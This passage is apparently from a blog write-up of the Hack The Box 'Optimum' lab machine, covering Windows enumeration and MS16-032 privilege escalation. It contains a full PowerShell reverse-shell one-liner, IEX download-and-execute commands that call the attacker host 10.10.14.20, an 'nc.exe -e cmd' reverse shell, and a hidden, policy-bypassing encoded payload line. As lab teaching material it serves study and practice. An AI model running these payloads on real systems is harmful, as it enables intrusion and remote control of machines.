</span></span></code></pre></div><p>The command is encoded helping us to keep the victim machine from noticing.</p><p>In this exploit only we need to change the lhost, lport and rhost, rport and run it.</p><p><img loading=lazy src=/HTB/optimum-4.png alt=Untitled></p><h2 id=gaining-an-initial-foothold>Gaining an Initial Foothold<a hidden class=anchor aria-hidden=true href=#gaining-an-initial-foothold>#</a></h2><p>Once executed we have successfully engaged the user.</p><p>Let’s cat the <strong>user’s flag</strong>.</p><p><img loading=lazy src=/HTB/optimum-5.png alt=Untitled></p><h2 id=escalating-privilege>Escalating Privilege<a hidden class=anchor aria-hidden=true href=#escalating-privilege>#</a></h2><p>Now let’s see more information about the system with winPEAS. We can send it via a smb server.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>smbserver</span><span class=p>.</span><span class=py>py</span> <span class=n>smbFolder</span> <span class=vm>$</span><span class=p>(</span><span class=n>pwd</span><span class=p>)</span> <span class=n>-smb2support</span>
</span></span></code></pre></div><p>Only lefts copy it with:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>copy </span><span class=p>\\</span><span class=mf>10.10</span><span class=p>.</span><span class=py>14</span><span class=p>.</span><span class=mf>20</span><span class=p>\</span><span class=n>smbFolder</span><span class=p>\</span><span class=n>winPEASx64</span><span class=p>.</span><span class=py>exe</span> <span class=p>.</span>
</span></span></code></pre></div><p>Once executed we have the next valuable information.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl>		<span class=n>Hostname</span><span class=err>:</span> <span class=n>optimum</span>                               
</span></span><span class=line><span class=cl>    <span class=n>ProductName</span><span class=err>:</span> <span class=n>Windows</span> <span class=n>Server</span> <span class=mf>2012</span> <span class=n>R2</span> <span class=n>Standard</span>
</span></span><span class=line><span class=cl>    <span class=n>EditionID</span><span class=err>:</span> <span class=n>ServerStandard</span>                       
</span></span><span class=line><span class=cl>    <span class=n>ReleaseId</span><span class=err>:</span>                                      
</span></span><span class=line><span class=cl>    <span class=n>BuildBranch</span><span class=err>:</span>                                    
</span></span><span class=line><span class=cl>    <span class=n>CurrentMajorVersionNumber</span><span class=err>:</span>                      
</span></span><span class=line><span class=cl>    <span class=n>CurrentVersion</span><span class=err>:</span> <span class=mf>6.3</span>                             
</span></span><span class=line><span class=cl>    <span class=n>Architecture</span><span class=err>:</span> <span class=n>AMD64</span>
</span></span></code></pre></div><p>Now let’s take a look if this system has some common windows vulns to privesc. Normally I start with Watson but the minimum .NET version required by Watson in winPEAS is 4.5, and this host only has up to 4.0, so I am going to start with Sherlock.</p><p>First let&rsquo;s open a web server to load the script.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>python3</span> <span class=o>-</span><span class=n>m</span> <span class=n>http</span><span class=o>.</span><span class=n>server</span> <span class=mi>80</span>
</span></span></code></pre></div><p>Now let’s load the script with powershell.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>IEX</span><span class=p>(</span><span class=nb>New-Object</span> <span class=n>Net</span><span class=p>.</span><span class=n>Webclient</span><span class=p>).</span><span class=py>downloadString</span><span class=p>(</span><span class=s1>&#39;http://10.10.14.20/Sherlock.ps1&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>We can start the scan with <code>Find-AllVulns</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>Title</span>      <span class=err>:</span> <span class=n>User</span> <span class=n>Mode</span> <span class=n>to</span> <span class=n>Ring</span> <span class=p>(</span><span class=n>KiTrap0D</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>MSBulletin</span> <span class=err>:</span> <span class=n>MS10</span><span class=p>-</span><span class=mf>015</span>
</span></span><span class=line><span class=cl><span class=n>CVEID</span>      <span class=err>:</span> <span class=mf>2010</span><span class=p>-</span><span class=mf>0232</span>
</span></span><span class=line><span class=cl><span class=n>Link</span>       <span class=err>:</span> <span class=n>https</span><span class=err>:</span><span class=p>//</span><span class=n>www</span><span class=p>.</span><span class=nb>exploit-db</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>exploits</span><span class=p>/</span><span class=mf>11199</span><span class=p>/</span>
</span></span><span class=line><span class=cl><span class=n>VulnStatus</span> <span class=err>:</span> <span class=n>Not</span> <span class=n>supported</span> <span class=n>on</span> <span class=mf>64</span><span class=n>-bit</span> <span class=n>systems</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Title</span>      <span class=err>:</span> <span class=n>Task</span> <span class=n>Scheduler</span> <span class=p>.</span><span class=py>XML</span>
</span></span><span class=line><span class=cl><span class=n>MSBulletin</span> <span class=err>:</span> <span class=n>MS10</span><span class=p>-</span><span class=mf>092</span>
</span></span><span class=line><span class=cl><span class=n>CVEID</span>      <span class=err>:</span> <span class=mf>2010</span><span class=p>-</span><span class=mf>3338</span><span class=p>,</span> <span class=mf>2010</span><span class=p>-</span><span class=mf>3888</span>
</span></span><span class=line><span class=cl><span class=n>Link</span>       <span class=err>:</span> <span class=n>https</span><span class=err>:</span><span class=p>//</span><span class=n>www</span><span class=p>.</span><span class=nb>exploit-db</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>exploits</span><span class=p>/</span><span class=mf>19930</span><span class=p>/</span>
</span></span><span class=line><span class=cl><span class=n>VulnStatus</span> <span class=err>:</span> <span class=n>Not</span> <span class=n>Vulnerable</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Title</span>      <span class=err>:</span> <span class=n>NTUserMessageCall</span> <span class=n>Win32k</span> <span class=n>Kernel</span> <span class=n>Pool</span> <span class=n>Overflow</span>
</span></span><span class=line><span class=cl><span class=n>MSBulletin</span> <span class=err>:</span> <span class=n>MS13</span><span class=p>-</span><span class=mf>053</span>
</span></span><span class=line><span class=cl><span class=n>CVEID</span>      <span class=err>:</span> <span class=mf>2013</span><span class=p>-</span><span class=mf>1300</span>
</span></span><span class=line><span class=cl><span class=n>Link</span>       <span class=err>:</span> <span class=n>https</span><span class=err>:</span><span class=p>//</span><span class=n>www</span><span class=p>.</span><span class=nb>exploit-db</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>exploits</span><span class=p>/</span><span class=mf>33213</span><span class=p>/</span>
</span></span><span class=line><span class=cl><span class=n>VulnStatus</span> <span class=err>:</span> <span class=n>Not</span> <span class=n>supported</span> <span class=n>on</span> <span class=mf>64</span><span class=n>-bit</span> <span class=n>systems</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Title</span>      <span class=err>:</span> <span class=n>TrackPopupMenuEx</span> <span class=n>Win32k</span> <span class=n>NULL</span> <span class=n>Page</span>
</span></span><span class=line><span class=cl><span class=n>MSBulletin</span> <span class=err>:</span> <span class=n>MS13</span><span class=p>-</span><span class=mf>081</span>
</span></span><span class=line><span class=cl><span class=n>CVEID</span>      <span class=err>:</span> <span class=mf>2013</span><span class=p>-</span><span class=mf>3881</span>
</span></span><span class=line><span class=cl><span class=n>Link</span>       <span class=err>:</span> <span class=n>https</span><span class=err>:</span><span class=p>//</span><span class=n>www</span><span class=p>.</span><span class=nb>exploit-db</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>exploits</span><span class=p>/</span><span class=mf>31576</span><span class=p>/</span>
</span></span><span class=line><span class=cl><span class=n>VulnStatus</span> <span class=err>:</span> <span class=n>Not</span> <span class=n>supported</span> <span class=n>on</span> <span class=mf>64</span><span class=n>-bit</span> <span class=n>systems</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Title</span>      <span class=err>:</span> <span class=n>TrackPopupMenu</span> <span class=n>Win32k</span> <span class=n>Null</span> <span class=n>Pointer</span> <span class=n>Dereference</span>
</span></span><span class=line><span class=cl><span class=n>MSBulletin</span> <span class=err>:</span> <span class=n>MS14</span><span class=p>-</span><span class=mf>058</span>
</span></span><span class=line><span class=cl><span class=n>CVEID</span>      <span class=err>:</span> <span class=mf>2014</span><span class=p>-</span><span class=mf>4113</span>
</span></span><span class=line><span class=cl><span class=n>Link</span>       <span class=err>:</span> <span class=n>https</span><span class=err>:</span><span class=p>//</span><span class=n>www</span><span class=p>.</span><span class=nb>exploit-db</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>exploits</span><span class=p>/</span><span class=mf>35101</span><span class=p>/</span>
</span></span><span class=line><span class=cl><span class=n>VulnStatus</span> <span class=err>:</span> <span class=n>Not</span> <span class=n>Vulnerable</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Title</span>      <span class=err>:</span> <span class=n>ClientCopyImage</span> <span class=n>Win32k</span>
</span></span><span class=line><span class=cl><span class=n>MSBulletin</span> <span class=err>:</span> <span class=n>MS15</span><span class=p>-</span><span class=mf>051</span>
</span></span><span class=line><span class=cl><span class=n>CVEID</span>      <span class=err>:</span> <span class=mf>2015</span><span class=p>-</span><span class=mf>1701</span><span class=p>,</span> <span class=mf>2015</span><span class=p>-</span><span class=mf>2433</span>
</span></span><span class=line><span class=cl><span class=n>Link</span>       <span class=err>:</span> <span class=n>https</span><span class=err>:</span><span class=p>//</span><span class=n>www</span><span class=p>.</span><span class=nb>exploit-db</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>exploits</span><span class=p>/</span><span class=mf>37367</span><span class=p>/</span>
</span></span><span class=line><span class=cl><span class=n>VulnStatus</span> <span class=err>:</span> <span class=n>Not</span> <span class=n>Vulnerable</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Title</span>      <span class=err>:</span> <span class=n>Font</span> <span class=n>Driver</span> <span class=n>Buffer</span> <span class=n>Overflow</span>
</span></span><span class=line><span class=cl><span class=n>MSBulletin</span> <span class=err>:</span> <span class=n>MS15</span><span class=p>-</span><span class=mf>078</span>
</span></span><span class=line><span class=cl><span class=n>CVEID</span>      <span class=err>:</span> <span class=mf>2015</span><span class=p>-</span><span class=mf>2426</span><span class=p>,</span> <span class=mf>2015</span><span class=p>-</span><span class=mf>2433</span>
</span></span><span class=line><span class=cl><span class=n>Link</span>       <span class=err>:</span> <span class=n>https</span><span class=err>:</span><span class=p>//</span><span class=n>www</span><span class=p>.</span><span class=nb>exploit-db</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>exploits</span><span class=p>/</span><span class=mf>38222</span><span class=p>/</span>
</span></span><span class=line><span class=cl><span class=n>VulnStatus</span> <span class=err>:</span> <span class=n>Not</span> <span class=n>Vulnerable</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Title</span>      <span class=err>:</span> <span class=s1>&#39;mrxdav.sys&#39;</span> <span class=n>WebDAV</span>
</span></span><span class=line><span class=cl><span class=n>MSBulletin</span> <span class=err>:</span> <span class=n>MS16</span><span class=p>-</span><span class=mf>016</span>
</span></span><span class=line><span class=cl><span class=n>CVEID</span>      <span class=err>:</span> <span class=mf>2016</span><span class=p>-</span><span class=mf>0051</span>
</span></span><span class=line><span class=cl><span class=n>Link</span>       <span class=err>:</span> <span class=n>https</span><span class=err>:</span><span class=p>//</span><span class=n>www</span><span class=p>.</span><span class=nb>exploit-db</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>exploits</span><span class=p>/</span><span class=mf>40085</span><span class=p>/</span>
</span></span><span class=line><span class=cl><span class=n>VulnStatus</span> <span class=err>:</span> <span class=n>Not</span> <span class=n>supported</span> <span class=n>on</span> <span class=mf>64</span><span class=n>-bit</span> <span class=n>systems</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Title</span>      <span class=err>:</span> <span class=n>Secondary</span> <span class=n>Logon</span> <span class=n>Handle</span>
</span></span><span class=line><span class=cl><span class=n>MSBulletin</span> <span class=err>:</span> <span class=n>MS16</span><span class=p>-</span><span class=mf>032</span>
</span></span><span class=line><span class=cl><span class=n>CVEID</span>      <span class=err>:</span> <span class=mf>2016</span><span class=p>-</span><span class=mf>0099</span>
</span></span><span class=line><span class=cl><span class=n>Link</span>       <span class=err>:</span> <span class=n>https</span><span class=err>:</span><span class=p>//</span><span class=n>www</span><span class=p>.</span><span class=nb>exploit-db</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>exploits</span><span class=p>/</span><span class=mf>39719</span><span class=p>/</span>
</span></span><span class=line><span class=cl><span class=n>VulnStatus</span> <span class=err>:</span> <span class=n>Appears</span> <span class=n>Vulnerable</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Title</span>      <span class=err>:</span> <span class=n>Windows</span> <span class=nb>Kernel-Mode</span> <span class=n>Drivers</span> <span class=n>EoP</span>
</span></span><span class=line><span class=cl><span class=n>MSBulletin</span> <span class=err>:</span> <span class=n>MS16</span><span class=p>-</span><span class=mf>034</span>
</span></span><span class=line><span class=cl><span class=n>CVEID</span>      <span class=err>:</span> <span class=mf>2016</span><span class=p>-</span><span class=mf>0093</span><span class=p>/</span><span class=mf>94</span><span class=p>/</span><span class=mf>95</span><span class=p>/</span><span class=mf>96</span>
</span></span><span class=line><span class=cl><span class=n>Link</span>       <span class=err>:</span> <span class=n>https</span><span class=err>:</span><span class=p>//</span><span class=n>github</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>SecWiki</span><span class=p>/</span><span class=nb>windows-kernel</span><span class=n>-exploits</span><span class=p>/</span><span class=n>tree</span><span class=p>/</span><span class=n>master</span><span class=p>/</span><span class=n>MS1</span>
</span></span><span class=line><span class=cl>             <span class=mf>6</span><span class=p>-</span><span class=mf>034</span><span class=p>?</span>
</span></span><span class=line><span class=cl><span class=n>VulnStatus</span> <span class=err>:</span> <span class=n>Appears</span> <span class=n>Vulnerable</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Title</span>      <span class=err>:</span> <span class=n>Win32k</span> <span class=n>Elevation</span> <span class=n>of</span> <span class=n>Privilege</span>
</span></span><span class=line><span class=cl><span class=n>MSBulletin</span> <span class=err>:</span> <span class=n>MS16</span><span class=p>-</span><span class=mf>135</span>
</span></span><span class=line><span class=cl><span class=n>CVEID</span>      <span class=err>:</span> <span class=mf>2016</span><span class=p>-</span><span class=mf>7255</span>
</span></span><span class=line><span class=cl><span class=n>Link</span>       <span class=err>:</span> <span class=n>https</span><span class=err>:</span><span class=p>//</span><span class=n>github</span><span class=p>.</span><span class=n>com</span><span class=p>/</span><span class=n>FuzzySecurity</span><span class=p>/</span><span class=nb>PSKernel-Primitives</span><span class=p>/</span><span class=n>tree</span><span class=p>/</span><span class=n>master</span><span class=p>/</span><span class=n>S</span>
</span></span><span class=line><span class=cl>             <span class=nb>ample-Exploits</span><span class=p>/</span><span class=n>MS16</span><span class=p>-</span><span class=mf>135</span>
</span></span><span class=line><span class=cl><span class=n>VulnStatus</span> <span class=err>:</span> <span class=n>Appears</span> <span class=n>Vulnerable</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Title</span>      <span class=err>:</span> <span class=n>Nessus</span> <span class=n>Agent</span> <span class=mf>6.6</span><span class=p>.</span><span class=py>2</span> <span class=p>-</span> <span class=mf>6.10</span><span class=p>.</span><span class=py>3</span>
</span></span><span class=line><span class=cl><span class=n>MSBulletin</span> <span class=err>:</span> <span class=n>N</span><span class=p>/</span><span class=n>A</span>
</span></span><span class=line><span class=cl><span class=n>CVEID</span>      <span class=err>:</span> <span class=mf>2017</span><span class=p>-</span><span class=mf>7199</span>
</span></span><span class=line><span class=cl><span class=n>Link</span>       <span class=err>:</span> <span class=n>https</span><span class=err>:</span><span class=p>//</span><span class=n>aspe1337</span><span class=p>.</span><span class=py>blogspot</span><span class=p>.</span><span class=py>co</span><span class=p>.</span><span class=n>uk</span><span class=p>/</span><span class=mf>2017</span><span class=p>/</span><span class=mf>04</span><span class=p>/</span><span class=nb>writeup-of</span><span class=n>-cve</span><span class=p>-</span><span class=mf>2017</span><span class=p>-</span><span class=mf>7199</span><span class=p>.</span><span class=nb>h
</span></span></span><span class=line><span class=cl><span class=nb></span>             <span class=n>tml</span>
</span></span><span class=line><span class=cl><span class=n>VulnStatus</span> <span class=err>:</span> <span class=n>Not</span> <span class=n>Vulnerable</span>
</span></span></code></pre></div><p>The only three vulns that Appears Vulnerable are the <strong>MS16-032</strong>, <strong>MS16-034</strong> and <strong>MS16-135</strong>.</p><p>I tried to run the three vulns many different ways but no one seems to work, then I realized of the importance of the architecture.</p><p>If we put the next command:</p><p><img loading=lazy src=/HTB/optimum-6.png alt=Untitled></p><p>We observe that the system is 64 bits but the powershell that we have is 32 bits one. Our scripts can’t be loaded.</p><p>There is a way to change the shell to a 64 bits one by putting the absolut path of the shell we are going to use in the command injection script. We can follow the next table to know where is the powershell path depending on the architecture we start from.</p><p><img loading=lazy src=/HTB/optimum-7.webp alt=Untitled></p><p>Changing the path in the script, the payload line looks like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c># Define the payload to be included in the URL</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=p>=</span> <span class=n>f</span><span class=s1>&#39;exec|\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}&#39;</span>
</span></span></code></pre></div><p>Let’s run it again and check if this works well.</p><p><img loading=lazy src=/HTB/optimum-8.png alt=Untitled></p><h3 id=ms16-032>MS16-032<a hidden class=anchor aria-hidden=true href=#ms16-032>#</a></h3><p>If we follow the <a href=https://www.exploit-db.com/exploits/39719>link</a> of the sherlock scan we can see that is an exploit db powershell script, so let’s download it with <strong>searchsploit.</strong></p><p>If we put again the http server, try to load it and run it, the script doesn’t seems to do nothing.</p><p><img loading=lazy src=/HTB/optimum-9.png alt=Untitled></p><p>It’s possible that the scripts is popping a new window shell with root privilege, but in our scenario it doesn’t help us. I found a variation of this script <a href=https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1>here</a> which allow us to introduce a command to the root shell, so I created a powershell file called <strong>revShell.ps1</strong> with only the reverse shell command and started a http server in the file directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nv>$client</span> <span class=p>=</span> <span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Net</span><span class=p>.</span><span class=py>Sockets</span><span class=p>.</span><span class=py>TCPClient</span><span class=p>(</span><span class=s2>&#34;10.10.14.20&#34;</span><span class=p>,</span><span class=mf>4444</span><span class=p>);</span> <span class=nv>$stream</span> <span class=p>=</span> <span class=nv>$client</span><span class=p>.</span><span class=py>GetStream</span><span class=p>();</span> <span class=p>[</span><span class=no>byte[]</span><span class=p>]</span><span class=nv>$bytes</span> <span class=p>=</span> <span class=mf>0</span><span class=p>.</span><span class=mf>.65535</span><span class=p>|%{{</span><span class=mf>0</span><span class=p>}};</span> <span class=k>while</span><span class=p>((</span><span class=nv>$i</span> <span class=p>=</span> <span class=nv>$stream</span><span class=p>.</span><span class=py>Read</span><span class=p>(</span><span class=nv>$bytes</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=nv>$bytes</span><span class=p>.</span><span class=n>Length</span><span class=p>))</span> <span class=o>-ne</span> <span class=mf>0</span><span class=p>){{;</span> <span class=nv>$data</span> <span class=p>=</span> <span class=p>(</span><span class=nb>New-Object</span> <span class=n>-TypeName</span> <span class=n>System</span><span class=p>.</span><span class=py>Text</span><span class=p>.</span><span class=n>ASCIIEncoding</span><span class=p>).</span><span class=py>GetString</span><span class=p>(</span><span class=nv>$bytes</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=nv>$i</span><span class=p>);</span> <span class=nv>$sendback</span> <span class=p>=</span> <span class=p>(</span><span class=nb>Invoke-Expression</span> <span class=nv>$data</span> <span class=mf>2</span><span class=p>&gt;&amp;</span><span class=mf>1</span> <span class=p>|</span> <span class=nb>Out-String</span> <span class=p>);</span> <span class=nv>$sendback2</span> <span class=p>=</span> <span class=nv>$sendback</span> <span class=p>+</span> <span class=s2>&#34;PS &#34;</span> <span class=p>+</span> <span class=p>(</span><span class=nb>Get-Location</span><span class=p>).</span><span class=py>Path</span> <span class=p>+</span> <span class=s2>&#34;&gt; &#34;</span><span class=p>;</span> <span class=nv>$sendbyte</span> <span class=p>=</span> <span class=p>([</span><span class=no>text.encoding</span><span class=p>]::</span><span class=n>ASCII</span><span class=p>).</span><span class=py>GetBytes</span><span class=p>(</span><span class=nv>$sendback2</span><span class=p>);</span> <span class=nv>$stream</span><span class=p>.</span><span class=py>Write</span><span class=p>(</span><span class=nv>$sendbyte</span><span class=p>,</span><span class=mf>0</span><span class=p>,</span><span class=nv>$sendbyte</span><span class=p>.</span><span class=n>Length</span><span class=p>);</span> <span class=nv>$stream</span><span class=p>.</span><span class=py>Flush</span><span class=p>()}};</span> <span class=nv>$client</span><span class=p>.</span><span class=py>Close</span><span class=p>()</span>
</span></span></code></pre></div><p>And with a nc listener, I run the Invoke-MS16032.ps1 script with the next command.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nc -lv <span class=m>4444</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>Invoke-MS16032</span> <span class=n>-Command</span> <span class=s2>&#34;IEX(New-Object Net.Webclient).downloadString(&#39;http://10.10.14.20/revShell.ps1&#39;)&#34;</span>
</span></span></code></pre></div><p>I tried to run the previous command in many different ways but doesn’t worked, so I changed a little bit the script to put a nc reverse shell instead.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Temp</span><span class=p>\</span><span class=n>PrivEsc</span><span class=p>\</span><span class=n>nc</span><span class=p>.</span><span class=py>exe</span> <span class=n>-e</span> <span class=n>cmd</span> <span class=mf>10.10</span><span class=p>.</span><span class=py>14</span><span class=p>.</span><span class=py>20</span> <span class=mf>4444</span>
</span></span></code></pre></div><p>In this way, only we will need to copy a nc binary into the <code>\Windows\Temp\PrivEsc</code> folder, so I started a <a href=http://smbserver.py>smbserver.py</a> to copy it (The binary which I used is the <a href=https://github.com/danielmiessler/SecLists/tree/master/Web-Shells/FuzzDB>SecLists</a> one).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=nb>cd </span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Temp</span>
</span></span><span class=line><span class=cl><span class=n>mkdir</span> <span class=n>PrivEsc</span>
</span></span><span class=line><span class=cl><span class=nb>copy </span><span class=p>\\</span><span class=mf>10.10</span><span class=p>.</span><span class=py>14</span><span class=p>.</span><span class=mf>20</span><span class=p>\</span><span class=n>smbFolder</span><span class=p>\</span><span class=n>nc</span><span class=p>.</span><span class=py>exe</span> <span class=p>.</span>
</span></span></code></pre></div><p>Now let’s run again the command.</p><p>We are root now.</p><p><img loading=lazy src=/HTB/optimum-10.png alt=Untitled></p><p>Only have to find <strong>root’s flag.</strong></p><p><img loading=lazy src=/HTB/optimum-11.png alt=Untitled></p><p><strong>Thank you for reading, and happy hacking! 😄</strong></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://pwndside.github.io/tags/windows/>windows</a></li><li><a href=https://pwndside.github.io/tags/web/>web</a></li><li><a href=https://pwndside.github.io/tags/privesc/>privesc</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://pwndside.github.io/>PwndSide</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>